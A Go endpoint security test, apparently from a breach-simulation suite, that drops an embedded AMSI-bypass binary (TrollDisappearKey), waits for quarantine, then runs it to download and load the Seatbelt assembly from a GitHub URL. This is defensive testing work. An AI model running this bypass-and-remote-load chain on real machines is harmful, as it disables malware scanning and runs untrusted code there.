//go:build windows
// +build windows

/*
ID: c1f0fe6f-6907-4f95-820d-47e0a39abe54
NAME: TrollDisappearKey AMSI Bypass Detection
TECHNIQUES: T1562.001
TACTICS: defense-evasion
SEVERITY: high
TARGET: windows-endpoint
COMPLEXITY: low
THREAT_ACTOR: N/A
SUBCATEGORY: edr-evasion
TAGS: amsi-bypass, registry, trolldisappearkey
UNIT: response
CREATED: 2025-01-05
AUTHOR: sectest-builder
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID = "c1f0fe6f-6907-4f95-820d-47e0a39abe54"
	TEST_NAME = "TrollDisappearKey AMSI Bypass Detection"
)

//go:embed troll_disappear_key.exe
var malicious []byte

func execute() error {
	// Define target drop path
	targetDir := `c:\F0`
	targetPath := filepath.Join(targetDir, "troll_disappear_key.exe")

	// Attempt to bypass AMSI and load a .NET assembly
	// Using Seatbelt as a test payload (security enumeration tool that would trigger AMSI)
	Endpoint.Say("Testing AMSI bypass with remote .NET assembly loading (Seatbelt)")

	command := []string{
		targetPath,
		"https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe",
		"AMSIProviders",
		"Software\\Microsoft\\AMSI\\Providers",
	}

	output, err := Endpoint.Shell(command)

	// Check for security blocking vs normal execution
	if err != nil {
		errorMsg := err.Error()

		// Check for security software blocking indicators
		securityBlockingKeywords := []string{
			"access denied", "access is denied", "blocked", "quarantine",
			"virus", "malware", "threat", "security", "permission denied",
			"execution prevented", "policy", "restricted", "forbidden",
		}

		isSecurityBlocked := false
		for _, keyword := range securityBlockingKeywords {
			if strings.Contains(strings.ToLower(errorMsg), keyword) {
				isSecurityBlocked = true
				break
			}
		}

		if isSecurityBlocked {
			// Security software blocked execution
			return fmt.Errorf("TrollDisappearKey was blocked by security software: %v", err)
		}

		// Some other error that's not security blocking - may be normal
		Endpoint.Say("TrollDisappearKey execution completed with error (may be normal): %v", err)
	}

	// Check output to confirm assembly execution
	outputStr := string(output)
	if len(outputStr) > 0 {
		Endpoint.Say("Assembly executed successfully - AMSI bypass worked!")
		Endpoint.Say("Assembly output: %s", outputStr)
	} else {
		Endpoint.Say("TrollDisappearKey executed successfully - AMSI bypass appears to have worked")
	}

	// Clean up any potential artifacts
	possibleArtifacts := []string{
		filepath.Join(targetDir, "Seatbelt.exe"),
		filepath.Join(targetDir, "temp_assembly.exe"),
		targetPath, // Clean up the TrollDisappearKey binary itself
	}

	for _, artifact := range possibleArtifacts {
		if _, err := os.Stat(artifact); err == nil {
			os.Remove(artifact)
			Endpoint.Say("Cleaned up artifact: %s", artifact)
		}
	}

	return nil
}

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA TEST: %s", TEST_NAME)
	Endpoint.Say("Test ID: %s", TEST_UUID)
	Endpoint.Say("=================================================================")

	metadata := TestMetadata{
		Version:       "1.0.0",
		Category:      "edr-evasion",
		Severity:      "high",
		Techniques:    []string{"T1562.001"},
		Tactics:       []string{"defense-evasion"},
		Score:         7.9,
		RubricVersion: "v1",
		Tags:          []string{"amsi-bypass", "registry", "trolldisappearkey"},
	}

	orgInfo := ResolveOrganization("")
	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			SaveLog(999, fmt.Sprintf("Panic: %v", r))
		}
	}()

	// ===== Phase 1: Drop binary and check for quarantine =====
	LogPhaseStart(0, "Binary Drop & Quarantine Check")

	targetDir := `c:\F0`
	targetPath := filepath.Join(targetDir, "troll_disappear_key.exe")

	if err := os.MkdirAll(targetDir, 0755); err != nil {
		LogMessage("ERROR", "Setup", fmt.Sprintf("Failed to create target directory %s: %v", targetDir, err))
		LogPhaseEnd(0, "failed", fmt.Sprintf("Directory creation failed: %v", err))
		Endpoint.Say("Failed to create target directory %s: %v", targetDir, err)
		SaveLog(999, fmt.Sprintf("Failed to create target directory: %v", err))
		os.Exit(999)
	}

	// Write embedded binary to disk
	Endpoint.Say("Extracting TrollDisappearKey AMSI bypass tool to %s for quarantine test", targetDir)
	if err := os.WriteFile(targetPath, malicious, 0755); err != nil {
		LogMessage("ERROR", "Binary Drop", fmt.Sprintf("Failed to write binary: %v", err))
		LogPhaseEnd(0, "failed", fmt.Sprintf("Binary write failed: %v", err))
		Endpoint.Say("Failed to write TrollDisappearKey binary: %v", err)
		SaveLog(999, fmt.Sprintf("Failed to write binary: %v", err))
		os.Exit(999)
	}

	fileInfo, _ := os.Stat(targetPath)
	if fileInfo != nil {
		LogFileDropped("troll_disappear_key.exe", targetPath, fileInfo.Size(), false)
	}

	// Pause to allow AV/EDR to react
	Endpoint.Say("Pausing for 3 seconds to gauge defensive reaction")
	time.Sleep(3 * time.Second)

	// Check if file was quarantined using os.Stat (per Bug Prevention Rules)
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		LogMessage("SUCCESS", "Quarantine Check", "TrollDisappearKey binary was caught and quarantined!")
		LogFileDropped("troll_disappear_key.exe", targetPath, 0, true)
		LogPhaseEnd(0, "blocked", "Binary quarantined on extraction")
		Endpoint.Say("TrollDisappearKey binary was caught and quarantined!")
		SaveLog(105, "TrollDisappearKey binary quarantined on extraction")
		os.Exit(105)
	}

	LogMessage("INFO", "Quarantine Check", "Binary survived quarantine check - proceeding to execution")
	LogPhaseEnd(0, "success", "Binary not quarantined")

	// ===== Phase 2: Execute AMSI bypass =====
	LogPhaseStart(1, "AMSI Bypass Execution")

	Endpoint.Say("TrollDisappearKey binary was not caught, attempting AMSI bypass execution")

	err := execute()
	if err != nil {
		LogMessage("SUCCESS", "Execution", fmt.Sprintf("TrollDisappearKey execution was prevented: %v", err))
		LogPhaseEnd(1, "blocked", fmt.Sprintf("Execution prevented: %v", err))
		Endpoint.Say("Got error \"%v\" when executing TrollDisappearKey", err)
		SaveLog(126, fmt.Sprintf("TrollDisappearKey execution prevented: %v", err))
		os.Exit(126)
	}

	LogMessage("WARN", "Execution", "TrollDisappearKey execution was not prevented - AMSI bypass succeeded")
	LogPhaseEnd(1, "success", "AMSI bypass succeeded - endpoint unprotected")

	Endpoint.Say("TrollDisappearKey execution was not prevented - AMSI bypass succeeded")
	SaveLog(101, "TrollDisappearKey AMSI bypass succeeded - endpoint unprotected")
	os.Exit(101)
}
